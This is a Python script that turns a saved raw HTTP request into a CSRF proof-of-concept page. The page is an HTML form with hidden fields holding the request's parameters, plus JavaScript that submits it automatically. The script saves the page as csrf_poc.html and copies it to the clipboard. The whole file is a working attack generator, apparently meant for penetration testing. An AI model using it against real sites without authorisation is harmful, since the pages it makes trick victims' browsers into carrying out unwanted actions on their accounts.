import sys
from airium import Airium
import pyperclip
import urllib.parse
import html

if len(sys.argv) < 3:
	print("Usage: python script.py <filename> <protocol>")
	sys.exit(1)
protocol = sys.argv[2]
filename = sys.argv[1]

try:
	with open(filename, 'r') as file:
    		data = file.read()
except FileNotFoundError:
	print(f"Error: File '{filename}' not found.")
	sys.exit(1)
try:
	req_method = data.split(" ")[0]
	req_host = data.split("\n")[1].split(" ")[1]
	

	if req_method == 'GET':
		req_path = data.splitlines()[0].split(' ')[1].split('?')[0]
		req_body = data.splitlines()[0].split('?')[1].split('&')
		req_body[-1] = req_body[-1].split(' ')[0]
	else:
		req_path = data.split(" ")[1]
		req_body = data.splitlines()[-1].split('&')
	parameters = {item.split('=')[0]:item.split('=')[1] for item in req_body}
	req_url = protocol+ "://" + req_host + req_path
except IndexError:
    print("Error: Failed to parse the request. Please check the input format.")
    sys.exit(1)
	
a = Airium()

with a.html():
	with a.body():
		if req_method == 'POST':
			with a.form(action=req_url, method=req_method):
				for key, value in parameters.items():
					value = urllib.parse.unquote(value)
					a.input(type="hidden", name=key, value=value)
				a.input(type='submit', value='Submit')
			with a.script():
				a('document.forms[0].submit()')
		else:
			with a.form(action=req_url):
				for key, value in parameters.items():
					value = urllib.parse.unquote(value)
					a.input(type="hidden", name=key, value=value)
				a.input(type='submit', value='Submit')
			with a.script():
				a('document.forms[0].submit()')

html_output = str(a)

with open('csrf_poc.html', 'w') as f:
	f.write(html_output)
pyperclip.copy(html_output)
print("POC is written to 'csrf_poc.html' file and copied to your clipboard.")






